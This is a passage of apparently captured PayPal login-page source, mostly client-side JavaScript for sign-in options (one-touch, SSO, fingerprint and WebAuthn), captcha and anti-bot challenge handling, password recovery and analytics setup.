                                    n.push({ evt: "design", data: e.isInContextIntegration() ? "in-context" : "full-context", instrument: !0 }),
                                    s && n.push({ evt: "page_lang", data: s.value, instrument: !0 }),
                                    n.push({ evt: r, data: "PREPARE_PAGE_" + i.toUpperCase(), calEvent: !0 }),
                                    t.clientLog(n, null);
                            }
                            function o(e, t) {
                                var n = document.querySelector(".notifications"),
                                    r,
                                    i;
                                n && ((r = document.createElement("p")), (i = document.createTextNode(e)), r.setAttribute("class", "notification " + t), r.setAttribute("role", "alert"), r.appendChild(i), n.appendChild(r));
                            }
                            function u() {
                                var t = document.querySelectorAll("form[name=login] input[type=hidden]"),
                                    n = document.querySelector("input[name=login_email]"),
                                    r = $("body").data("oneTouchUser"),
                                    i = $("body").data("cookieBannerEnabled"),
                                    u = { _csrf: 1, intent: 1, flowId: 1, ctxId: 1, returnUri: 1, state: 1, "locale.x": 1 },
                                    a = {};
                                for (var f = 0; f < t.length; f++) u[t[f].name] && (a[t[f].name] = t[f].value);
                                if (!a.intent || !a.returnUri || !r) {
                                    e.hideSpinner(), autoLoginfallBackClientLog();
                                    return;
                                }
                                (a.otLoginIntent = a.intent),
                                    (a.login_email = n && n.value),
                                    e.showSpinner(),
                                    e.showSpinnerMessage("secureMessage"),
                                    e.showSpinnerMessage("oneTouchMessage"),
                                    s(),
                                    $.ajax({
                                        url: "/signin/ot-token",
                                        method: "POST",
                                        data: a,
                                        success: function (t) {
                                            var n;
                                            if (t.smartlockOptIn && login.smartLock) {
                                                login.smartLock(t);
                                                return;
                                            }
                                            if (t.returnUrl) {
                                                window.location.href = t.returnUrl;
                                                return;
                                            }
                                            (n = t.notifications),
                                                n && o(n.msg, n.type),
                                                e.hideSpinner(),
                                                e.hideSpinnerMessage("secureMessage"),
                                                e.hideSpinnerMessage("oneTouchMessage"),
                                                autoLoginfallBackClientLog({ error_code: "ot_login_failed" }),
                                                i && e.showCookieBanner();
                                        },
                                        fail: function (t) {
                                            e.hideSpinner(), e.hideSpinnerMessage("secureMessage"), e.hideSpinnerMessage("oneTouchMessage"), autoLoginfallBackClientLog({ error_code: "ot_login_xhr_fail" }), i && e.showCookieBanner();
                                        },
                                    });
                            }
                            var e = login.utils,
                                t = login.logger,
                                n = window.PAYPAL.ulData || {},
                                r = "ONETOUCH_LOGIN",
                                i = e.getIntent();
                            return function () {
                                var r = $("body").data("oneTouchUser"),
                                    i = $("body").data("tpdautosend"),
                                    s = n.aPayAuth;
                                if (!s && r) {
                                    u();
                                    return;
                                }
                                if (s && n.canNotMakePayment) {
                                    u();
                                    return;
                                }
                                !i && !isAPaySupported() && !r && e.hideSpinner();
                            };
                        })()),
                        (login.showHidePassword = (function () {
                            function e(e, t) {
                                function s() {
                                    $(n).addClass("hide"), $(r).addClass("hide");
                                }
                                function o(e) {
                                    t === "tel" ? $(i).removeClass("tel-password") : i.setAttribute("type", t),
                                        $(n).addClass("hide"),
                                        $(r).removeClass("hide"),
                                        i.focus(),
                                        e.stopPropagation(),
                                        login.logger.log({ evt: "is_pwd_sh", data: "Y", instrument: !0 }),
                                        login.logger.pushLogs();
                                }
                                function u(e) {
                                    t === "tel" ? $(i).addClass("tel-password") : i.setAttribute("type", "password"),
                                        $(n).removeClass("hide"),
                                        $(r).addClass("hide"),
                                        i.focus(),
                                        e.stopPropagation(),
                                        login.logger.log({ evt: "is_pwd_sh", data: "N", instrument: !0 }),
                                        login.logger.pushLogs();
                                }
                                function a(e) {
                                    s();
                                    if (login.utils.isFieldPrefilled(i) || i.value.length > 0)
                                        t === "text" ? (i.getAttribute("type") === "password" ? $(n).removeClass("hide") : $(r).removeClass("hide")) : $(i).hasClass("tel-password") ? $(n).removeClass("hide") : $(r).removeClass("hide");
                                    e.stopPropagation();
                                }
                                var n = e.querySelector(".showPassword"),
                                    r = e.querySelector(".hidePassword"),
                                    i = e.querySelector(".pin-password");
                                (t = t || "text"),
                                    t === "tel" && $(i).addClass("tel-password"),
                                    (n.onclick = o),
                                    (r.onclick = u),
                                    (i.onfocus = a),
                                    addEvent(i, "keyup", a),
                                    (i.onclick = function (e) {
                                        e.stopPropagation();
                                    }),
                                    (window.onclick = s);
                            }
                            return function () {
                                var n = $(document.body).data("showHidePassword"),
                                    r = document.querySelector("#signUpSection"),
                                    i = document.querySelector("#passwordSection"),
                                    s = document.querySelector("#pinSection") || document.querySelector("#splitPinSection"),
                                    o;
                                s && (o = s.querySelector(".pin-password"));
                                if (!n) {
                                    o && $(o).addClass("tel-password");
                                    return;
                                }
                                r && e(r), i && e(i), s && o && e(s, o.getAttribute("type") === "tel" ? "tel" : "text");
                            };
                        })()),
                        (login.oneTouch = (function () {
                            return function () {
                                var t = document.querySelector(".keepMeLoginAbout"),
                                    n = document.getElementById("keepMeLoginTerms"),
                                    r = document.querySelector(".keepMeLogin .tagLine"),
                                    i = login.utils.getKmliCb(),
                                    s = "scTrack:unifiedlogin-rememberme-about-open",
                                    o = "scTrack:unifiedlogin-rememberme-about-close",
                                    u = "scTrack:unifiedlogin-rememberme-opt-in",
                                    a = "scTrack:unifiedlogin-rememberme-opt-out";
                                if (!i || !t || !n) return;
                                t.setAttribute("href", "#"),
                                    (t.onclick = function () {
                                        $(n).hasClass("slideUp")
                                            ? ($(n).removeClass("slideUp"),
                                              $(n).addClass("slideDown"),
                                              $(t).attr("aria-expanded", "true"),
                                              setTimeout(function () {
                                                  $(t).removeClass(s), $(t).addClass(o);
                                              }, 10))
                                            : ($(n).removeClass("slideDown"),
                                              $(n).addClass("slideUp"),
                                              $(t).attr("aria-expanded", "false"),
                                              setTimeout(function () {
                                                  $(t).removeClass(o), $(t).addClass(s);
                                              }, 10)),
                                            t.focus(),
                                            r && $(r).toggle(),
                                            setTimeout(function () {
                                                window.dispatchEvent && window.dispatchEvent(createNewEvent("resize"));
                                            }, 200);
                                    }),
                                    (i.onclick = function () {
                                        setTimeout(function () {
                                            $(i).hasClass(u) ? ($(i).removeClass(u), $(i).addClass(a)) : ($(i).removeClass(a), $(i).addClass(u));
                                        }, 10);
                                    });
                            };
                        })()),
                        (login.footer = (function () {
                            function n() {
                                var e = document.querySelector(".footer"),
                                    t = document.querySelector(".activeContent"),
                                    n = document.querySelector("#returnToMerchant"),
                                    r,
                                    i,
                                    s = (n && $(n).outerHeight()) || 0;
                                (r = $(t).outerHeight() + $(e).outerHeight() + s),
                                    (i =
                                        window.innerHeight ||
                                        (document.documentElement && document.documentElement.clientHeight) ||
                                        (window.screen && window.screen.height) ||
                                        document.height ||
                                        (document.body && document.body.offsetHeight)),
                                    i < r ? $(e).addClass("footerStayPut") : $(e).removeClass("footerStayPut");
                            }
                            var e = document.querySelectorAll(".localeSelector li a");
                            for (var t = 0; t < e.length; t++) e[t].onclick = login.utils.getOutboundLinksHandler(e[t], null, "process_language_change");
                            return function () {
                                n(), addEvent(window, "resize", n);
                            };
                        })()),
                        (login.pwr = (function () {
                            return function () {
                                function o(e) {
                                    e.preventDefault(),
                                        (s = document.createElement("div")),
                                        (s.className = "modal-underlay"),
                                        document.body.appendChild(s),
                                        (n.style.display = "block"),
                                        setTimeout(function () {
                                            (s.style.opacity = 0.7), (n.style.opacity = 1);
                                        }, 0),
                                        r.setAttribute("src", $(r).data("src")),
                                        r.focus(),
                                        (r.onload = function () {
                                            a(), r.focus();
                                        }),
                                        login.logger.log({ evt: "state_name", data: login.logger.getStateName(), instrument: !0 }),
                                        login.logger.log({ evt: "transition_name", data: "process_password_recovery", instrument: !0 }),
                                        login.logger.pushLogs();
                                }
                                function u() {
                                    var e = document.querySelector(".modal-underlay");
                                    document.body.removeChild(e), (n.style.display = "none"), r.setAttribute("src", "about:blank"), t && t.length > 0 && t[1].focus();
                                }
                                function a() {
                                    var e = window.innerHeight || document.documentElement.clientHeight;
                                    e <= n.clientHeight ? ((n.style.transform = "translate(-50%, 0%)"), (n.style.top = 0)) : ((n.style.transform = "translate(-50%, -50%)"), (n.style.top = "50%"));
                                }
                                var t = document.querySelectorAll(".startPwrFlowBtn"),
                                    n = document.getElementById("password-recovery-modal"),
                                    r = document.getElementById("pwdIframe"),
                                    i,
                                    s;
                                r && login.utils.isInIframe() && r.setAttribute("target", "_blank");
                                if (t && t.length > 0 && !login.utils.isInIframe()) {
                                    (i = document.createElement("button")),
                                        (i.className = "ui-dialog-titlebar-close"),
                                        i.setAttribute("type", "button"),
                                        i.setAttribute("alt", "Close"),
                                        i.setAttribute("aria-label", "Close"),
                                        n.appendChild(i);
                                    for (var f = 0; f < t.length; f++) addEvent(t[f], "click", o);
                                    (i.onclick = u),
                                        addEvent(r, "focusout", function (e) {
                                            e.preventDefault(), i.focus();
                                        }),
                                        (i.onkeydown = function (e) {
                                            e.which === 9 && r.focus();
                                        }),
                                        addEvent(window, "resize", a);
                                }
                            };
                        })()),
                        (login.authCaptcha = (function () {
                            return function (t) {
                                function a(e) {
                                    e.preventDefault(),
                                        e.stopPropagation(),
                                        $.ajax({
                                            method: "GET",
                                            url: "/auth/refreshcaptcha",
                                            success: function (e) {
                                                e !== "undefined" &&
                                                    ($(".captcha-container img").attr("src", e.captchaImgUrl),
                                                    $(".captcha-container .audio a").attr("href", e.captchaAudioUrl),
                                                    $(".captcha-container input").val(""),
                                                    $("#captchaPlayer").attr("src", e.captchaAudioUrl),
                                                    $("body").hasClass("desktop") && $(".captcha-container input").focus());
                                            },
                                        });
                                }
                                function f(e) {
                                    var t = document.getElementById("captchaPlayer"),
                                        n = !!t.canPlayType && !!t.canPlayType("audio/mpeg;").replace(/no/, "");
                                    if (!n) return !0;
                                    e.preventDefault(), $(".captcha-container input").focus(), t.play();
                                }
                                function l(e) {
                                    $(e.container).addClass("hasError"), (e.container.style["z-index"] = 100), $(e.errMsgContainer).addClass("show"), e.field.focus();
                                }
                                function c(e) {
                                    $(e.errMsg).removeClass("hide");
                                }
                                function h(e) {
                                    $(e.errMsg).addClass("hide");
                                }
                                function p(e) {
                                    return e.field && typeof e.field.value == "string" && !e.field.value.trim() ? (l(e), c(e), !1) : !0;
                                }
                                function d(e) {
                                    var n = !0;
                                    return e && e.field && !t && (n = p(e)), n;
                                }
                                function v(e) {
                                    return e
                                        ? {
                                              container: e.querySelector("div.textInput"),
                                              field: e.querySelector("input[type=text]"),
                                              errMsgContainer: e.querySelector("div.errorMessage"),
                                              errMsg: e.querySelector("div.errorMessage .emptyError"),
                                          }
                                        : null;
                                }
                                function m(e) {
                                    var t = d(o),
                                        n = document.querySelector("form[name=challenge]"),
                                        r = {};
                                    (u = !0), e && eventPreventDefault(e);
                                    if (!t) return;
                                    login.utils.showSpinner();
                                    for (var i = 0; i < n.length; i++) r[n[i].name] = n[i].value;
                                    $.ajax({ url: s.getAttribute("action"), data: r, success: login.utils.successfulXhrHandler, fail: login.utils.failedXhrSubmitHandler });
                                }
                                function g(e) {
                                    $(e.container).hasClass("hasError") ? (u = !0) : (u = !1);
                                }
                                function y(e, t) {
                                    t && $(e.container).removeClass("hasError"), (e.container.style["z-index"] = 1), $(e.errMsgContainer).removeClass("show");
                                }
                                function b(e) {
                                    (u = !1), y(e);
                                }
                                function w(e) {
                                    var t = e.field.value.trim();
                                    if (!u) return !1;
                                    t === "" ? c(e) : (h(e), y(e, !0));
                                }
                                var n = document.querySelector(".captchaRefresh"),
                                    r = document.querySelector(".captchaPlay"),
                                    i = document.querySelector("#captcha"),
                                    s = document.querySelector("#ads-container form"),
                                    o = v(i),
                                    u = !1;
                                if (t) {
                                    m();
                                    return;
                                }
                                (n.onclick = a), (r.onclick = f), (s.onsubmit = m), (o.field.onfocus = g.bind(null, o)), (o.field.onblur = b.bind(null, o)), (o.field.onkeyup = w.bind(null, o));
                            };
                        })()),
                        (login.ads = (function () {
                            function init(e) {
                                var t,
                                    n = e || $("body").data("adsChallengeUrl");
                                $.ajax({
                                    url: n,
                                    method: "GET",
                                    success: function (e) {
                                        (t = document.createElement("script")),
                                            (t.id = "ads"),
                                            (t.type = "text/javascript"),
                                            t.setAttribute("nonce", $("body").data("nonce")),
                                            (t.text = e.replace(/<\/?(html|body|script)>/g, "")),
                                            document.body.appendChild(t);
                                    },
                                    fail: function (e) {},
                                });
                            }
                            function handleAdsInterception(htmlResponse) {
                                var isAutoSubmit = !0,
                                    adsContainerId = "ads-container",
                                    adsContainerDiv,
                                    scriptNodes,
                                    adsCaptchaType;
                                document.getElementById("ads-container") && document.getElementById("ads-container").parentNode.removeChild(document.getElementById("ads-container")),
                                    (adsContainerDiv = document.createElement("div")),
                                    adsContainerDiv.setAttribute("id", adsContainerId),
                                    (adsContainerDiv.innerHTML = htmlResponse),
                                    $("#main").append(adsContainerDiv),
                                    (scriptNodes = adsContainerDiv.getElementsByTagName("script"));
                                for (var i = 0; i < scriptNodes.length; i++) eval.call(this, scriptNodes[i].innerHTML);
                                typeof autosubmit != "undefined" && (isAutoSubmit = autosubmit),
                                    typeof captchatype != "undefined" && (adsCaptchaType = captchatype),
                                    isAutoSubmit ? (document.getElementById("ads-container").style.display = "none") : $("#login").addClass("hide"),
                                    typeof login.authCaptcha == "function" && login.authCaptcha(isAutoSubmit),
                                    isAutoSubmit || (login.utils.hideSpinner(), login.utils.hideSpinnerMessage()),
                                    login.logger.log({ evt: "ads_state_name", data: isAutoSubmit ? "pre_jschallenge_served" : adsCaptchaType, instrument: !0 }),
                                    login.logger.pushLogs();
                            }
                            return { init: init, handleAdsInterception: handleAdsInterception };
                        })()),
                        (login.tpdLogin = (function () {
                            function i(e) {
                                var t = {};
                                if (!e) return;
                                login.logger.log({ evt: "state_name", data: e.stateName, instrument: !0 }),
                                    login.logger.log({ evt: "transition_name", data: e.transitionName, instrument: !0 }),
                                    e.calName && login.logger.log({ evt: "TPD_CLIENT", data: e.calName, calEvent: !0 }),
                                    login.logger.pushLogs();
                            }
                            function s() {
                                i({ stateName: "begin_tpd", transitionName: "prepare_verification" });
                            }
                            function o() {
                                i({ stateName: "begin_pwd", transitionName: "process_pwd_tpd_click", calName: "CLICKED_TPD_LOGIN" });
                            }
                            function u() {
                                i({ stateName: "begin_tpd", transitionName: "process_pwd_tpd_auto", calName: "AUTO_TPD_LOGIN" });
                            }
                            function a() {
                                i({ stateName: "begin_tpd", transitionName: "process_not_you" });
                            }
                            function f() {
                                i({ stateName: "begin_tpd", transitionName: "process_resend" });
                            }
                            function l() {
                                i({ stateName: "begin_tpd", transitionName: "process_use_pwd", calName: "USE_PASSWORD" });
                            }
                            function c() {
                                i({ stateName: "end_tpd_notification", transitionName: "expired_tpd_no_action", calName: "EXPIRED_TPD_NO_ACTION" });
                            }
                            function h(n) {
                                var r = document.querySelectorAll("form[name=login] input"),
                                    i = {},
                                    s = document.querySelector(".transitioning");
                                e.showSpinner();
                                for (var o = 0; o < r.length; o++) i[r[o].name] = r[o].value;
                                if (i.tpdEligible !== "true") {
                                    e.hideSpinner();
                                    return;
                                }
                                (i.splitLoginContext = n || "tpd"),
                                    delete i.login_password,
                                    delete i.login_pin,
                                    login.fn.addFnSyncData(),
                                    $.ajax({ url: t.getAttribute("action"), method: "POST", data: i, success: e.successfulXhrHandler, fail: e.failedXhrSubmitHandler });
                            }
                            function p() {
                                r && (u(), h("tpdAutoSend"));
                            }
                            var e = login.utils,
                                t = document.querySelector("form[name=login]"),
                                n = document.querySelector("#moreOptionsMobile"),
                                r = $("body").data("tpdautosend");
                            return {
                                instrumentVerificationViewRendered: s,
                                instrumentTpdLoginClicked: o,
                                instrumentTpdLoginAutoTriggered: u,
                                instrumentNotYouClicked: a,
                                instrumentResendClicked: f,
                                instrumentUsePasswordInstead: l,
                                initialize: p,
                                attemptTpdLogin: h,
                                instrumentTpdExpired: c,
                            };
                        })()),
                        (login.singleSignOn = (function () {
                            function r() {
                                var r = {},
                                    i = document.querySelectorAll("form[name=login] input[type=hidden]");
                                t && (e.showSpinner(), $(n).addClass("nonTransparentMask"), e.showSpinnerMessage("oneSecond"), (r.ssoViaToken = !0));
                                var s = { _csrf: 1, intent: 1, ctxId: 1, returnUri: 1, state: 1, authContextId: 1 };
                                for (var o = 0; o < i.length; o++) s[i[o].name] && (r[i[o].name] = i[o].value);
                                login.logger.log({ evt: "state_name", data: "sso_login", instrument: !0 }),
                                    login.logger.log({ evt: "transition_name", data: "prepare_sso_login", instrument: !0 }),
                                    login.logger.pushLogs(),
                                    $.ajax({
                                        url: "/signin/sso",
                                        method: "POST",
                                        data: r,
                                        success: function (t) {
                                            login.logger.log({ evt: "state_name", data: "sso_login", instrument: !0 }), login.logger.log({ evt: "transition_name", data: "process_sso_login", instrument: !0 }), login.logger.pushLogs();
                                            if (t.returnUrl) {
                                                window.location.href = t.returnUrl;
                                                return;
                                            }
                                            t.notifications && login.utils.updatePageLevelError(t.notifications.msg, t.notifications.type), e.hideSpinner(), e.hideSpinnerMessage("oneSecond"), e.hideSpinnerMessage("secureMessage");
                                        },
                                        fail: function (t) {
                                            e.hideSpinner(), e.hideSpinnerMessage("oneSecond"), e.hideSpinnerMessage("secureMessage");
                                        },
                                    });
                            }
                            var e = login.utils,
                                t = $("body").data("ssoviatoken"),
                                n = document.querySelector(".transitioning");
                            return function () {
                                if (t) {
                                    r();
                                    return;
                                }
                            };
                        })());
                    var fingerprint = fingerprint || {};
                    (fingerprint.lookup = function (e) {
                        function n(e) {
                            var t = document.querySelector("form[name=login]"),
                                n = document.createElement("input");
                            n.setAttribute("type", "hidden"), n.setAttribute("name", "availableAAID"), n.setAttribute("value", e), t && t.appendChild(n);
                        }
                        function r(r) {
                            var i,
                                s = [];
                            if (r && r.availableAuthenticators !== null) {
                                i = r.availableAuthenticators;
                                for (var o = 0; o < i.length; o++) s.push(i[o].aaid);
                            }
                            if (typeof e == "function") return e(s);
                            s.length > 0 && ((t.availableAuthenticatorsList = s), n(s));
                        }
                        function i(e) {
                            if (typeof e == "function") return e();
                        }
                        var t = (window.PAYPAL && window.PAYPAL.ulData) || {};
                        t.fingerprintProceed === "lookup" && navigator.uaf && navigator.uaf.discover(r, i);
                    }),
                        (fingerprint = fingerprint || {}),
                        (fingerprint.utils = (function () {
                            function t(t, n, r) {
                                var i = {};
                                (t = t || {}),
                                    t.data && (i = t.data),
                                    (i._csrf = e.getCSRFToken()),
                                    e.showSpinner(),
                                    e.showSpinnerMessage("oneSecond"),
                                    $.ajax({
                                        type: t.method || "POST",
                                        url: "/signin" + (t.path || ""),
                                        data: i,
                                        dataType: "json",
                                        success: function (t) {
                                            return e.setCSRFToken(t && t._csrf), n(t);
                                        },
                                        fail: r,
                                    });
                            }
                            function n(e, t) {
                                e &&
                                    navigator.uaf.processUAFOperation(
                                        e,
                                        function (e) {
                                            if (typeof t == "function") return t();
                                        },
                                        function (e) {
                                            if (typeof t == "function") return t();
                                        }
                                    );
                            }
                            function r(e) {
                                e &&
                                    navigator.uaf.processUAFOperation(
                                        e,
                                        function (e) {},
                                        function (e) {}
                                    );
                            }
                            function i(e) {
                                if (e) return { uafProtocolMessage: e, additionalData: null };
                            }
                            function s(t, n) {
                                eventPreventDefault(t),
                                    $.ajax({
                                        type: "POST",
                                        url: "/signin/not-you",
                                        data: { _csrf: document.querySelector("#token").value, notYou: !0, intent: e.getIntent(), context_id: e.getFlowId() },
                                        dataType: "json",
                                        complete: function () {
                                            if (typeof n == "function") return n();
                                        },
                                    });
                            }
                            var e = login.utils;
                            return { makeServiceRequest: t, getUafMessage: i, cancelUafOperation: n, deregisterUAFOperation: r, fpNotYouClickHandler: s };
                        })());
                    var fingerprint = fingerprint || {};
                    (fingerprint.login = function () {
                        function c(e) {
                            var n = e && e.getAttribute("href"),
                                r = document.querySelector("form[name=login] input[name=fpPromptWithError]");
                            t.showSpinner(), n ? (window.location.href = n) : (window.location.href = (r && r.value) || window.location.href + "&fpPrompt=login");
                        }
                        function h() {
                            var e = document.querySelector("#fpLoginNotYouLink");
                            e &&
                                (e.onclick = function (n) {
                                    n.preventDefault(),
                                        fingerprint.utils.cancelUafOperation(a),
                                        t.showSpinner(),
                                        fingerprint.utils.fpNotYouClickHandler(n, function () {
                                            var t = [l, { evt: "transition_name", data: "process_fp_not_you", instrument: !0 }];
                                            login.logger.clientLog(t, null), fingerprint.utils.deregisterUAFOperation(f), c(e);
                                        });
                                });
                        }
                        function p() {
                            var e = document.querySelector(".fpLoginUsePasswordLink");
                            e &&
                                (e.onclick = function (n) {
                                    n.preventDefault(), fingerprint.utils.cancelUafOperation(a), t.showSpinner();
                                    var r = [l, { evt: "transition_name", data: "process_use_password_instead", instrument: !0 }];
                                    login.logger.clientLog(r, function () {
                                        c(e);
                                    });
                                });
                        }
                        function d(e) {
                            var t = e && e.uafProtocolMessage,
                                n = document.querySelectorAll("form[name=login] input[type=hidden]"),
                                r = login.utils.getKmliCb(),
                                i = ["login_email", "login_password", "login_phone", "login_pin"],
                                s = {};
                            (t = JSON.parse(t)), t || c(), (s.uafResponse = JSON.stringify(t));
                            if (n.length) for (var o = 0; o < n.length; o++) for (var u = 0; u < i.length; u++) n[o] && n[o].name !== i[u] && (s[n[o].name] = n[o].value);
                            r && r.checked && (s.rememberMe = "true"),
                                fingerprint.utils.makeServiceRequest(
                                    { data: s },
                                    function (e) {
                                        e.returnUrl ? (window.location.href = e.returnUrl) : c();
                                    },
                                    function () {
                                        c();
                                    }
                                );
                        }
                        function v(e) {
                            var i = document.querySelector(".fpLoginTryAgain"),
                                s = document.querySelector(".headerIconThumbprint");
                            if (e === r) return;
                            if (n > 0) {
                                (n -= 1), t.showSpinner(), t.showSpinnerMessage("oneSecond");
                                var o = [l, { evt: "transition_name", data: "process_fp_login_retry", instrument: !0 }, { evt: "fp_login_error", data: e || "", instrument: !0 }];
                                return (
                                    login.logger.clientLog(o, null),
                                    setTimeout(function () {
                                        t.hideSpinner(), t.hideSpinnerMessage("oneSecond"), s && (s.className = "headerIconThumbprintError"), i && $(i).removeClass("hide"), m();
                                    }, 1e3)
                                );
                            }
                            c();
                        }
                        function m() {
                            navigator.uaf.processUAFOperation(u, d, v);
                        }
                        function g(e) {
                            (e = e || {}),
                                (a = fingerprint.utils.getUafMessage(e.cancelUafRequest)),
                                (f = fingerprint.utils.getUafMessage(e.deregUafRequest)),
                                e.uafRequest
                                    ? ((u = fingerprint.utils.getUafMessage(e.uafRequest)),
                                      t.hideSpinner(),
                                      fingerprint.utils.cancelUafOperation(a, function () {
                                          setTimeout(m, 500);
                                      }))
                                    : c();
                        }
                        function y() {
                            c();
                        }
                        var e = (window.PAYPAL && window.PAYPAL.ulData) || {},
                            t = login.utils,
                            n = 2,
                            r = 3,
                            i = document.querySelector(".fpLogin"),
                            s = document.querySelector(".footer"),
                            o = $("body").data("fpLoginError"),
                            u,
                            a,
                            f,
                            l = { evt: "state_name", data: "begin_fp_login", instrument: !0 };
                        e.fingerprintProceed === "login" && navigator.uaf && (h(), p(), fingerprint.utils.makeServiceRequest({ path: "/challenge/uaf" }, g, y));
                    }),
                        (login.webAuthnLogin = (function () {
                            function t(t) {
                                function n() {
                                    var e = t || {},
                                        n = {};
                                    return (
                                        (n.challenge = i(e.challenge)),
                                        "timeout" in e && (n.timeout = e.timeout),
                                        "rpId" in e && (n.rpId = e.rpId),
                                        "allowCredentials" in e && (n.allowCredentials = s(e.allowCredentials)),
                                        navigator.credentials.get({ publicKey: n })
                                    );
                                }
                                function r(e) {
                                    return btoa(
                                        new Uint8Array(e).reduce(function (e, t) {
                                            return e + String.fromCharCode(t);
                                        }, "")
                                    );
                                }
                                function i(e) {
                                    return Uint8Array.from(atob(e), function (e) {
                                        return e.charCodeAt(0);
                                    });
                                }
                                function s(e) {
                                    var t = [];
                                    for (var n = 0; n < e.length; n++) {
                                        var r = {};
                                        (r.type = e[n].type), (r.id = i(e[n].id)), "transports" in e && (r.transports = e.transports), t.push(r);
                                    }
                                    return t;
                                }
                                function o(t) {
                                    var n = document.querySelectorAll("form[name=login] input[type=hidden]"),
                                        i = {},
                                        s = {};
                                    for (var o = 0; o < n.length; o++) s[n[o].name] = n[o].value;
                                    "id" in t && (i.id = t.id), "type" in t && (i.type = t.type), "rawId" in t && (i.rawId = r(t.rawId));
                                    if ("response" in t) {
                                        var u = {};
                                        return (
                                            (u.clientDataJSON = r(t.response.clientDataJSON)),
                                            (u.authenticatorData = r(t.response.authenticatorData)),
                                            (u.signature = r(t.response.signature)),
                                            (u.userHandle = r(t.response.userHandle)),
                                            (i.response = u),
                                            (s.webauthn_response = JSON.stringify(i)),
                                            e.makeServerRequestAndReturnPromise("/signin", { data: s })
                                        );
                                    }
                                    return Promise.reject();
                                }
                                n()
                                    .then(o)
                                    .then(function (t) {
                                        t.returnUrl ? (window.location.href = t.returnUrl) : e.hideSpinner();
                                    })
                                    .catch(function (t) {
                                        e.hideSpinner();
                                    });
                            }
                            var e = login.utils;
                            return function () {
                                var n = $("body").data("webAuthnLoginContext"),
                                    r;
                                if (n && typeof navigator.credentials == "object" && typeof navigator.credentials.get == "function")
                                    try {
                                        (r = JSON.parse(n)), t(r);
                                    } catch (i) {}
                            };
                        })()),
                        (login.bootstrap = function () {
                            login.core(),
                                login.jwt && login.jwt(),
                                login.oneTouchLogin && login.oneTouchLogin(),
                                login.singleSignOn && login.singleSignOn(),
                                login.webAuthnLogin && login.webAuthnLogin(),
                                login.oneTouch(),
                                login.footer(),
                                login.pwr(),
                                login.ads.init(),
                                login.fn.initialize(),
                                login.checkoutIncontext && login.checkoutIncontext(),
                                login.checkoutIncontext && login.smartLock && login.smartLock(),
                                login.tpdLogin && login.tpdLogin.initialize(),
                                login.showHidePassword();
                        }),
                        (document.onreadystatechange = function () {
                            var e,
                                t = login.utils.getSplitLoginContext(),
                                n = $("body").data("cookieBannerEnabled"),
                                r = $("body").data("lazyLoadCountryCodes"),
                                i = $("body").data("tealeafEnable"),
                                s = $("body").data("oneTouchUser");
                            document.readyState === "complete" &&
                                (login.bootstrap(),
                                (e = (window.PAYPAL && window.PAYPAL.ulData) || {}),
                                e.preloadScriptUrl && asyncLoadScriptUrls(e.preloadScriptUrl),
                                t ? instrumentSplitLoginPageLoad(t) : instrumentUlAsLandingPageLoad(),
                                addEvent(document, "click", login.utils.documentClickHandler),
                                login.pubsub.subscribe("WINDOW_CLICK", login.utils.toggleRememberInfoTooltip),
                                showReturnToMerchantLink(),
                                e.fingerprintProceed === "lookup" && fingerprint && fingerprint.lookup(),
                                e.fingerprintProceed === "login" && fingerprint && fingerprint.login(),
                                n && !s && login.utils.showCookieBanner(),
                                r === "true" && login.utils.loadPhoneCountryCodes(),
                                i && login.teaLeaf());
                        }),
                        (login.teaLeaf = (function () {
                            return function () {
                                var t = document.getElementById("teaLeafconfig"),
                                    n = $("body").data("tealeafUrl");
                                t && t.parentNode && t.parentNode.removeChild(t),
                                    (t = document.createElement("script")),
                                    (t.id = "teaLeafconfig"),
                                    t.setAttribute("nonce", $("body").data("nonce")),
                                    (t.asyc = !0),
                                    (t.src = n),
                                    document.body.appendChild(t);
                            };
                        })());
                })();
        </script>
        <script src="https://www.paypalobjects.com/pa/js/min/pa.js"></script>
        <script nonce="OdHJON702gbbVy4cAFWxaboMpVOk5muI1jhED3XwaB6eOIPN">
            (function () {
                if (typeof PAYPAL.analytics != "undefined") {
                    PAYPAL.core = PAYPAL.core || {};
                    PAYPAL.core.pta = PAYPAL.analytics.setup({
                        data:
                            "pgrp=main%3Aunifiedlogin%3A%3A%3Alogin&page=main%3Aunifiedlogin%3A%3A%3Alogin%3A%3A%3A&tmpl=unifiedloginnodeweb%2Fpublic%2Ftemplates%2FcontextualLoginView%2Fsignin.dust&pgst=1529847217718&calc=24a8af95a8e6a&rsta=en_US&pgtf=Nodejs&env=live&s=ci&csci=e2766dcd8e0d4fb998f4896a844797e4&comp=unifiedloginnodeweb&tsrce=authnodeweb&transition_name=ss_prepare_pwd&xe=2322%2C3182%2C3966%2C2977%2C3862%2C3465&xt=5566%2C7594%2C9474%2C7132%2C9227%2C8254&ctx_login_ot_content=1&obex=signin&landing_page=login&state_name=begin_pwd&ctx_login_ctxid_fetch=ctxid-not-exist&ctx_login_content_fetch=success&ctx_login_lang_footer=shown&ctx_login_signup_btn=shown%7Cdefault&ctx_login_intent=signin&ctx_login_flow=Signin&ctx_login_state_transition=login_loaded&post_login_redirect=default&ret_url=%2F",
                        url: "https:\/\/t.paypal.com\/ts",
                    });
                    try {
                        var pageData = PAYPAL.analytics.Analytics.prototype.utils.queryStringToObject(
                            "pgrp=main%3Aunifiedlogin%3A%3A%3Alogin&page=main%3Aunifiedlogin%3A%3A%3Alogin%3A%3A%3A&tmpl=unifiedloginnodeweb%2Fpublic%2Ftemplates%2FcontextualLoginView%2Fsignin.dust&pgst=1529847217718&calc=24a8af95a8e6a&rsta=en_US&pgtf=Nodejs&env=live&s=ci&csci=e2766dcd8e0d4fb998f4896a844797e4&comp=unifiedloginnodeweb&tsrce=authnodeweb&transition_name=ss_prepare_pwd&xe=2322%2C3182%2C3966%2C2977%2C3862%2C3465&xt=5566%2C7594%2C9474%2C7132%2C9227%2C8254&ctx_login_ot_content=1&obex=signin&landing_page=login&state_name=begin_pwd&ctx_login_ctxid_fetch=ctxid-not-exist&ctx_login_content_fetch=success&ctx_login_lang_footer=shown&ctx_login_signup_btn=shown%7Cdefault&ctx_login_intent=signin&ctx_login_flow=Signin&ctx_login_state_transition=login_loaded&post_login_redirect=default&ret_url=%2F"
                        );
                        PAYPAL.analytics.endCPLTracking({ inferStart: true, pageData: pageData });
                    } catch (e) {}
                }
            })();
        </script>
        <noscript>
            <img
